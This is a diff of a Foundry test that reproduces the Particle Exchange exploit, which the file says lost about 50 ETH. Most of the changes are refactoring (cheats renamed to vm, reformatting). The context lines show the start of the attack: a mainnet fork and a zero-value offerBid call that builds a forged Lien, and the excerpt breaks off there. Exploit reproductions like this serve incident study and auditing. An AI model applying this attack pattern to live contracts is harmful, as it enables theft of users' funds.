@@ -2,7 +2,6 @@
 pragma solidity ^0.8.24;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~50 $ETH
 // Attacker : https://etherscan.io/address/0x2c903f97ea69b393ea03e7fab8d64d722b3f5559
@@ -15,12 +14,9 @@ import "./../interface.sol";
 
 interface IParticleExchange {
 
-    function offerBid(
-        address collection,
-        uint256 margin,
-        uint256 price,
-        uint256 rate
-    ) external returns (uint256 lienId);
+    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
+        external
+        returns (uint256 lienId);
     function swapWithEth(Lien calldata lien, uint256 lienId) external;
     function onERC721Received(address, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
     function withdrawAccountBalance() external;
@@ -47,16 +43,15 @@ contract ContractTest is Test {
     address Azuki = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
     address Reservoir = 0xC2c862322E9c97D6244a3506655DA95F05246Fd8;
     address ParticleExchange = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     address ownerofaddr = address(proxy);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 19_231_445);
-        cheats.label(address(proxy), "proxy");
-        cheats.label(address(Azuki), "Azuki");
-        cheats.label(address(ParticleExchange), "ParticleExchange");
-        cheats.label(address(Reservoir), "Reservoir");
+        vm.createSelectFork("mainnet", 19_231_445);
+        vm.label(address(proxy), "proxy");
+        vm.label(address(Azuki), "Azuki");
+        vm.label(address(ParticleExchange), "ParticleExchange");
+        vm.label(address(Reservoir), "Reservoir");
     }
 
     function testExploit() public {
@@ -64,7 +59,7 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
         uint256 tokenId = 50_126_827_091_960_426_151;
         uint256 tokenId2 = 19_231_446;
-        (uint256 lienId) = proxy.offerBid(address(this), uint256(0), uint256(0), uint256(0));
+        uint256 lienId = proxy.offerBid(address(this), uint256(0), uint256(0), uint256(0));
         IParticleExchange.Lien memory lien = IParticleExchange.Lien({
             lender: zero,
             borrower: address(this),
